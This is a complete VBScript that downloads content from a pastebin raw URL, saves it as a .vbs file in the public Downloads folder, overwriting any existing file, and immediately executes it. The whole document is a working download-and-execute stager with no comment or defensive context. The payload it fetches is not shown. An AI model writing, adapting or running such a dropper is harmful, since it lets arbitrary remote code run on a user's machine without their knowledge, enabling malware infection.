dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://pastebin.com/raw/AVpYrXgG", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\Downloads\Bruh.vbs", 2 '//overwrite
end with

CreateObject("WScript.Shell").Run "C:\Users\Public\Downloads\Bruh.vbs"